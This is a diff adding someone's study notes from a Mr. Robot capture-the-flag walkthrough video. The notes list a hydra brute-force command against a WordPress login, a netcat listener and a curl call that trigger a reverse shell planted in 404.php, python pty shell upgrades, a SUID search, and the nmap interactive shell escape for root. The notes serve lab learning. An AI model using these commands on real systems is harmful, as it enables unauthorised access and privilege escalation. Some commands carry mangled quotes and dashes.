@@ -1,0 +1,59 @@
+Techniques
+
+Format 30=<space>name<space>30=
+============================== From ==============================
+https://www.youtube.com/watch?v=nuF5_vpKiuY&list=PLBf0hzazHTGOyRReqMyE-CDMWAQ5AgXO-&index=2
+
+Mr. Robot CTF Walkthrough - Part 1 and Part 2
+
+Format 30=<space>name<space>30=
+============================== Learned ==============================
+
+If you have a large dictionary then try to make it unique and in sorted
+
+cat wordlist.disc | sort -u | uniq > wordlist1.disc
+
+hydra -V -L wordlist.disc -p 123 192.168.1.108 http-post-form ‘/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username’
+
+
+Instead go through web page I can do curl and instead of adding file I can change the internal php file for reverse shell 
+nc -lvp 1234
+curl http://192.168.1.108/404.php
+
+
+What tty Means Today:
+It represents the terminal session you're using.
+
+If you’ve gotten a shell access (like through a reverse shell or a limited environment) and there’s no TTY, many commands won’t work properly (like sudo, su, nano, arrow keys, tab completion, etc.). So, you'll want to upgrade the shell to a full TTY.
+
+/bin/sh -I
+python -c 'import pty; pty.spawn("/bin/sh”)’
+
+
+🧠 First: Check Your Shell Type
+echo $0
+
+Or just try:
+tty
+
+If it says something like:
+not a tty
+Then you’re in a non-interactive or barebones shell.
+
+
+✅ Ways to Get a TTY (Interactive Shell)
+
+🔹 1. Python TTY Upgrade (Most Popular)
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+or if only Python3 is available:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+privilege esclation
+find / -perm -4000 2>/dev/null
+
+Nmap interactive mode
+nmap —interactive
+!sh
+
